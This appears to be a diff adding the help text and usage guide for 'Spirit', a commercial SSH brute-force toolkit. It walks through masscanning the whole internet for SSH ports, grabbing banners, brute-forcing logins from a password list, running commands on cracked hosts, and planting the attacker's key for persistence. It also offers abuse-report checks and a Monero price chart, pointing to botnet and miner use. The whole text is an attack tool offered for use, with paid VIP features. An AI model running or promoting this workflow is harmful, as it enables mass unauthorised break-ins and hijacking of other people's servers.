@@ -1,0 +1,72 @@
+
+  __    __    ___
+ / _\  /  \  / __)   Spirit - smart SSH brute toolkit
+/    \(  O )( (_ \   Telegram Support: https://t.me/aogspirit
+\_/\_/ \__/  \___/   https://github.com/theaog/spirit
+
+Beta release, under active development.
+Report bugs and suggest features on Telegram.
+
+NAME:
+   spirit - smart SSH brute toolkit
+
+USAGE:
+   $ ./masscan --rate="5000" --ports "22,222,2222,2212" 0.0.0.0/0 -oG open.lst
+   Scanning 357886782 hosts [4 ports/host]
+   
+   $ ./spirit parse open.lst
+   INFO created h.lst in HOST:PORT format
+   
+   $ ./spirit --jobs 600 --timeout 1s banner
+   SSH-2.0-OpenSSH_8.2p  13% [=>                  ] (3686/26803) [11s:1m15s]
+   INFO created b.lst in HOST:PORT:BANNER format
+   
+   $ mv b.lst h.lst
+   $ ./spirit --jobs 1500
+   INFO loaded h.lst with 26803 hosts
+   INFO loaded p.lst with 4881 logins
+   INFO estimated completion in ~1h27m36s
+   root:!1qwerty 192.168.0.1:22 found [77] blocked [33] 20% [====>               ] (1567/87216) [20s:1h13m36s]
+   
+   You can automate these steps with ./spirit auto
+
+VERSION:
+   v1.39.0
+
+AUTHORS:
+   aog <aog7@protonmail.com>
+   exo <exo7@protonmail.com>
+
+COMMANDS:
+   help, h  Shows a list of commands or help for one command
+   attack:
+     banner, b       extract SSH banners e.g. SSH-2.0-OpenSSH [stealth] -- (FREE)
+     auto, a         auto run [parse (open.lst), banner (h.lst), brute (h.lst, p.lst)]
+     omni, o, massh  execute commands on multiple hosts concurrently
+     swarm           [HOST:PORT] run the API Server to receive found hosts (*Under Development)
+   licensing:
+     premium     [KEY] register Spirit Premium license
+     upgrade, u  receive the latest improvements and bug fixes
+   tools:
+     scan, s   [CLASS] [PORT] -- (FREE)
+     parse, p  [FILE] parses masscan -oG output -- (FREE)
+     abuse     check your host IP against abuse report databases
+     ports     [NUMBER] generate random ports 1-65535 (default 5)
+     coin      [ticker] default shows XMR (Monero) price chart
+
+GLOBAL OPTIONS:
+   --jobs value, -j value     maximum number of concurrent jobs (connections) (default: 100)
+   --timeout value, -t value  connection timeout in seconds (default: 5s)
+   --logins FILE, -l FILE     load logins FILE in USER:PASS format (default: "p.lst")
+   --hosts FILE, -H FILE      load hosts FILE in IP:PORT format (default: "h.lst")
+   --command value, -c value  list of commands to execute on successful login (default: uname -a)
+   --block, -b                block unreachable/filtered hosts to speed up bruting time (default: true)
+   --key FILE, -k FILE        brute using a private key FILE on all users (*VIP feature)
+   --addkey, -K               automatically add your private key on successful login (*VIP feature) (default: false)
+   --api HOST:PORT            submit vulnerable hosts via JSON API to HOST:PORT (*VIP feature) (Not Implemented Yet)
+   --debug, -d                print debug logs (default: false)
+   --help, -h                 show help (default: false)
+   --version, -v              print the version (default: false)
+
+COPYRIGHT:
+   (c) The Armor of God
